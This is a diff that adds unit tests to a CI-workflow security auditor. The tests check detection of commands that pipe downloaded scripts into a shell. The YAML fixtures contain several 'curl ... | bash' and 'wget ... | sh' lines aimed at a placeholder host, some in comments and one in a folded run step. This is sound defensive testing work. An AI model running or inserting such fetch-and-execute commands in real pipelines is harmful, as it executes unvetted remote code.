@@ -78,6 +78,49 @@ jobs:
   assert.equal(finding.line, 11);
 });
 
+test("auditWorkflow ignores pipe-to-shell text in YAML comments", () => {
+  const findings = auditWorkflow({
+    path: "/tmp/ci.yml",
+    relativePath: "ci.yml",
+    content: `name: CI
+# curl https://example.invalid/install.sh | bash
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      # - run: wget -qO- https://example.invalid/install.sh | sh
+      - run: npm test # curl https://example.invalid/install.sh | bash
+`,
+  });
+  assert.equal(findings.some((finding) => finding.id === "pipe-to-shell"), false);
+});
+
+test("auditWorkflow detects pipe-to-shell commands in folded run scalars", () => {
+  const findings = auditWorkflow({
+    path: "/tmp/ci.yml",
+    relativePath: "ci.yml",
+    content: `name: CI
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - run: >-
+          echo preparing &&
+          curl https://example.invalid/install.sh |
+          bash
+`,
+  });
+  const finding = findings.find((candidate) => candidate.id === "pipe-to-shell");
+  assert.ok(finding);
+  assert.equal(finding.line, 11);
+});
+
 test("auditWorkflow recommends npm ci for reproducible installs", () => {
   const findings = auditWorkflow({
     path: "/tmp/ci.yml",
